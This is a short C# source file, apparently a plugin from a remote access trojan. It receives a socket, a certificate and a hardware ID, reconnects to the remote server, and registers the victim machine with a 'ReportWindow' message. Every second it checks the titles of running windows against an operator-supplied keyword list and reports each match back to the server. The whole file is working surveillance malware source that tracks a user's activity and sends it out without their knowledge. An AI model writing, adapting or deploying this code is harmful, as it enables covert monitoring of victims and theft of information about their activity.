using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	private static List<string> title = new List<string>();

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		if (Client.itsConnect)
		{
			Client.Send(LEB128.Write(new object[2] { "ReportWindow", Hwid }));
		}
		object[] array = (object[])LEB128.Read(Pack)[0];
		foreach (object obj in array)
		{
			title.Add(((string)obj).ToLower());
		}
		int num = 30;
		while (Client.itsConnect)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (!string.IsNullOrEmpty(process.MainWindowTitle) && title.Any(process.MainWindowTitle.ToLower().Contains) && num > 30)
				{
					num = 0;
					Client.Send(LEB128.Write(new object[2]
					{
						"Report",
						process.MainWindowTitle.ToLower()
					}));
				}
			}
			num++;
			Thread.Sleep(1000);
		}
		Client.Disconnect();
		Thread.Sleep(5000);
	}
}
